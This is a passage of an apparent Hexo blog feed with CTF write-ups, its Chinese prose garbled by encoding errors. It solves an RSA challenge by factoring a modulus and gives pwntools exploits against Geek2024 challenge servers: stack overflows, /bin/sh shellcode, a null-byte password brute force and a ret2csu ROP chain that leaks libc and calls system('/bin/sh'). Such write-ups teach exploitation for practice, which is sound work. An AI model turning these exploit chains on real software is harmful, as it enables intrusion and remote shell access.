flag:<br>            <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>çˆ†ç ´å¤§çº¦åŠå°æ—¶å°±èƒ½å‡º</p><img src="/2024/12/12/HECTF2024/1733584094412-572102cc-7ac3-4337-b9c5-6498a4781aa9.png" class="" title="img"><h2 id="ç¿»ä¸€ç¿»"><a href="#ç¿»ä¸€ç¿»" class="headerlink" title="ç¿»ä¸€ç¿»"></a>ç¿»ä¸€ç¿»</h2><p>pæ˜¯qçš„10è¿›åˆ¶ç¿»è½¬ï¼Œæ‰¾åˆ°æ–‡ç« </p><p><a href="https://kt.gy/blog/2015/10/asis-2015-finals-rsasr/">https://kt.gy/blog/2015/10/asis-2015-finals-rsasr/</a></p><p>å…ˆå¾—åˆ°pq</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">n = <span class="hljs-number">404647938065363927581436797059920217726808592032894907516792959730610309231807721432452916075249512425255272010683662156287639951458857927130814934886426437345595825614662468173297926187946521587383884561536234303887166938763945988155320294755695229129209227291017751192918550531251138235455644646249817136993</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">t</span>(<span class="hljs-params">a, b, k</span>):<br><span class="hljs-comment"># sqrt(n) has 155 digits, so we need to figure out 77 digits on each side</span><br>    <span class="hljs-keyword">if</span> k == <span class="hljs-number">77</span>:<br>        <span class="hljs-keyword">if</span> a*b == n:<br>            <span class="hljs-built_in">print</span>(a, b)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br><span class="hljs-comment"># we try to guess the last not-already-guessed digits of both primes</span><br>            a1 = a + i*(<span class="hljs-number">10</span>**k) + j*(<span class="hljs-number">10</span>**(<span class="hljs-number">154</span>-k))<br>            b1 = b + j*(<span class="hljs-number">10</span>**k) + i*(<span class="hljs-number">10</span>**(<span class="hljs-number">154</span>-k))<br>            <span class="hljs-keyword">if</span> a1*b1 &gt; n:<br><span class="hljs-comment"># a1 and b1 are too large</span><br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">if</span> (a1+(<span class="hljs-number">10</span>**(<span class="hljs-number">154</span>-k)))*(b1+(<span class="hljs-number">10</span>**(<span class="hljs-number">154</span>-k))) &lt; n:<br><span class="hljs-comment"># a1 and b1 are too small</span><br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">if</span> ((a1*b1)%(<span class="hljs-number">10</span>**(k+<span class="hljs-number">1</span>))) != (n%(<span class="hljs-number">10</span>**(k+<span class="hljs-number">1</span>))):<br><span class="hljs-comment"># The last digits of a1*b1 (which won&#x27;t change later) doesn&#x27;t match n</span><br>                <span class="hljs-keyword">continue</span><br><span class="hljs-comment"># this a1 and b1 seem to be a possible match, try to guess remaining digits</span><br>            t(a1, b1, k+<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># the primes have odd number of digits (155), so we try all possible middle digits (it simplifies the code)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    t(i*(<span class="hljs-number">10</span>**<span class="hljs-number">77</span>), i*(<span class="hljs-number">10</span>**<span class="hljs-number">77</span>), <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>åé¢æ ‡å‡†rsa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br>c = <span class="hljs-number">365683379886722889532600303686680978443674067781851827634350197114193449886360409198931986483197030101273917834823409997256928872225094802167525677723275059148476025160768252077264285289388640035034637732158021710365512158554924957332812612377993122491979204310133332259340515767896224408367368108253503373778</span><br><span class="hljs-comment"># p=39316409865082827891559777929907275271727781922450971403181273772573121561800306699150395758615464222134092274991810028405823897933152302724628919678029201</span><br><span class="hljs-comment"># q=10292087691982642720325133979832850482001819947229043122246451685759305199660300816512137527737218130417905422918772717257270992977795519872828056890461393</span><br>p=<span class="hljs-number">10292087691982642720325133979832850482001819947229043122246451685759305199660300816512137527737218130417905422918772717257270992977795519872828056890461393</span><br>q=<span class="hljs-number">39316409865082827891559777929907275271727781922450971403181273772573121561800306699150395758615464222134092274991810028405823897933152302724628919678029201</span><br>e = <span class="hljs-number">65537</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = inverse(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, p*q)<br>a=long_to_bytes(m)<br><span class="hljs-built_in">print</span>(base64.b64decode(a))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RSA</tag>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Geek2024éƒ¨åˆ†Reverseä¸Pwn</title>
    <link href="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/"/>
    <url>/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/</url>
    
    <content type="html"><![CDATA[<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>é™åˆ¶1ç§’è¾“å…¥ï¼Œé‚£å°±è‡ªåŠ¨å®ç°</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731503838552-e81e0d11-85a5-48b1-9ec6-bdedc964cc2c.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    io = process(filename)<br><span class="hljs-keyword">else</span>:<br>io = remote(<span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="hljs-number">12304</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#return u32(io.recv()[0:4])</span><br><br>ru(<span class="hljs-string">&quot;challenge.&quot;</span>)<br>s(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>s=io.recvuntil(<span class="hljs-string">&quot; = &quot;</span>, drop=<span class="hljs-literal">True</span>)<br><span class="hljs-comment">#print(s)</span><br>s1=<span class="hljs-built_in">eval</span>(s)<br><span class="hljs-comment">#print(s1)</span><br>sl(<span class="hljs-built_in">str</span>(s1).encode())<br>inter()<br></code></pre></td></tr></table></figure><h2 id="stackover"><a href="#stackover" class="headerlink" title="stackover"></a>stackover</h2><p>æ ˆæº¢å‡ºåè·³åˆ°systemï¼Œä¸èƒ½ç›´æ¥è·³åˆ°keyï¼Œå› ä¸ºkeyä¸€å¼€å§‹ä¼šé”€æ¯æ ˆï¼Œå¯¼è‡´NX</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731734024192-79c0f250-cc97-44e5-92da-58889ac9d596.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><br>filename=<span class="hljs-string">&#x27;./stackover&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    io = process(filename)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="hljs-number">19265</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;</span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)<br>    attach(io,bk)<br><br>key=<span class="hljs-number">0x40072C</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">20</span>+p64(key)<br><span class="hljs-comment">#debug()</span><br>sla(<span class="hljs-string">&quot;Welcome to geek,what&#x27;s you name?&quot;</span>,payload)<br>inter()<br></code></pre></td></tr></table></figure><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>shellcodeé•¿åº¦è¶³å¤Ÿï¼Œç›´æ¥ç”¨ç³»ç»Ÿç”Ÿæˆçš„ï¼Œä¹‹åæº¢å‡ºè¿”å›åˆ°giftä¿®æ”¹bssæ®µæƒé™\</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731736711047-00c8c067-593e-4413-b83c-3c9bc159024d.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><br>filename=<span class="hljs-string">&#x27;./shellcode&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    io = process(filename)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="hljs-number">32143</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;</span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)<br>    attach(io,bk)<br><br>gift=<span class="hljs-number">0x401256</span><br><br>shellcode=asm(shellcraft.sh())<br>shellcode=shellcode.ljust(<span class="hljs-number">0x18f</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>sla(<span class="hljs-string">&quot;do you know shellcode?&quot;</span>,shellcode)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(gift)<br>sla(<span class="hljs-string">&quot;please input your name:&quot;</span>,payload)<br>inter()<br></code></pre></td></tr></table></figure><h2 id="000000"><a href="#000000" class="headerlink" title="000000"></a>000000</h2><p>urandomç”Ÿæˆéšæœºå¯†ç ï¼Œåˆ©ç”¨strcmpåŒ¹é…åˆ°â€™\00â€™ç»“æŸçˆ†ç ´å¯†ç </p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731738555131-cd425a4f-2cb7-4b25-9130-01079af2eb48.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>filename=<span class="hljs-string">&#x27;./main&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    io = process(filename)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="hljs-number">42198</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;</span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)<br>    attach(io,bk)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br> <span class="hljs-keyword">try</span>:<br>    io = remote(<span class="hljs-string">&quot;nc1.ctfplus.cn&quot;</span>,<span class="hljs-number">34516</span>)<br>    sla(<span class="hljs-string">&quot;Enter the password: &quot;</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    response1 = io.recvline()<br>    response = io.recvline()<br>    <span class="hljs-comment">#print(response)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;SYC&#x27;</span> <span class="hljs-keyword">in</span> response:<br>          <span class="hljs-built_in">print</span>(response)<br>          inter()<br>          <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>          io.close()<br> <span class="hljs-keyword">except</span> EOFError:<br>    io.close()<br>    <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><h2 id="su"><a href="#su" class="headerlink" title="su"></a>su</h2><p>æ–‡ä»¶åå·²ç»æç¤ºcsu</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731916667334-ca548886-3f3f-482e-a656-4428bca57b20.png" class="" title="img"><p>ç›´æ¥å¥—æ¨¡æ¿æ‰“ï¼Œæœ€åå¤±è´¥çš„æ—¶å€™åŠ ä¸ªret</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><br>filename=<span class="hljs-string">&#x27;./csu&#x27;</span><br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>io = process(filename)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="hljs-number">27363</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;</span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)<br>    attach(io,bk)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#return u32(io.recv()[0:4])</span><br><br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>pop_rdi_ret=<span class="hljs-number">0x400903</span><br>ret=<span class="hljs-number">0x4005d6</span><br>csu_front_addr=<span class="hljs-number">0x4008E0</span><br>csu_end_addr=<span class="hljs-number">0x4008FA</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rbx, rbp, r12, r13, r14, r15, last</span>):<br>    <span class="hljs-comment"># pop rbx,rbp,r12,r13,r14,r15</span><br>    <span class="hljs-comment"># rbx should be 0,</span><br>    <span class="hljs-comment"># rbp should be 1,enable not to jump</span><br>    <span class="hljs-comment"># r12 should be the function we want to call</span><br>    <span class="hljs-comment"># rdi=edi=r13d</span><br>    <span class="hljs-comment"># rsi=r14</span><br>    <span class="hljs-comment"># rdx=r15</span><br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x8</span><br>    payload += p64(csu_end_addr) <br>    payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)<br>    payload += p64(csu_front_addr)<br>    payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    payload += p64(last)<br>    <span class="hljs-comment">#debug()</span><br>    s(payload)<br><br>sla(<span class="hljs-string">&quot;[3] exit.&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, write_got,<span class="hljs-number">1</span>,write_got, <span class="hljs-number">0x8</span>, main_addr)<br>write_addr=get_addr()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;write:&quot;</span>,<span class="hljs-built_in">hex</span>(write_addr))<br>libc_base=write_addr-libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr=libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]+libc_base<br>bin_addr=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))+libc_base<br>sla(<span class="hljs-string">&quot;[3] exit.&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(ret)+p64(pop_rdi_ret)+p64(bin_addr)+p64(sys_addr)<br>sl(payload)<br>inter()<br></code></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="ezzzz"><a href="#ezzzz" class="headerlink" title="ezzzz"></a>ezzzz</h2><p>ä¸‰ä¸ªæ³¨æ„ç‚¹ï¼Œä¸€ä¸ªæ˜¯ä¸€å¼€å§‹çš„deltaï¼Œç¬¬äºŒä¸ªæ˜¯v0å’Œv1æ˜¯intï¼Œæœ€åå¼‚æˆ–(sum+i)ï¼Œé‚£ä¹ˆforè¦ä»i&#x3D;31é€†ç€æ¥</p><img 